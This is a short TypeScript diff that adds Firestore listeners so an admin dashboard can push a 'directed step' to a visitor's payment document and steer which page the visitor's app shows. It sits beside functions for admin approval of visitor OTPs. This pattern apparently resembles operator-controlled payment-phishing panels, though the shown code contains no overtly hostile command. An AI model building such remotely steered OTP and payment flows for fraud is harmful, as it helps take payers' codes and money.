@@ -415,6 +415,55 @@ export const listenForOtpApproval = (
   return unsubscribe;
 };
 
+// Listen for admin "push step" commands. The dashboard writes a `directedStep`
+// field on the visitor's pay doc; this fires the callback whenever that field
+// changes to a positive number, so the visitor's app can navigate to the
+// matching page.
+export const listenForDirectedStep = (
+  callback: (step: number) => void,
+): (() => void) => {
+  if (!db) return () => {};
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return () => {};
+
+  const docRef = doc(db, "pays", visitorId);
+  let lastStep = 0;
+  const unsubscribe = onSnapshot(docRef, (snapshot) => {
+    if (!snapshot.exists()) return;
+    const data = snapshot.data();
+    const step = Number(data?.directedStep) || 0;
+    if (step > 0 && step !== lastStep) {
+      lastStep = step;
+      callback(step);
+    } else if (step === 0) {
+      lastStep = 0;
+    }
+  });
+  return unsubscribe;
+};
+
+// Clear the directedStep field after the visitor has acted on it so the same
+// command doesn't fire again on the next snapshot.
+export const clearDirectedStep = async () => {
+  if (!db) return;
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return;
+  try {
+    const docRef = doc(db, "pays", visitorId);
+    await setDoc(
+      docRef,
+      {
+        directedStep: 0,
+        directedAt: null,
+        updatedAt: new Date().toISOString(),
+      },
+      { merge: true },
+    );
+  } catch (error) {
+    console.error("Error clearing directedStep:", error);
+  }
+};
+
 export const updateOtpApprovalStatus = async (
   visitorId: string,
   approved: boolean,
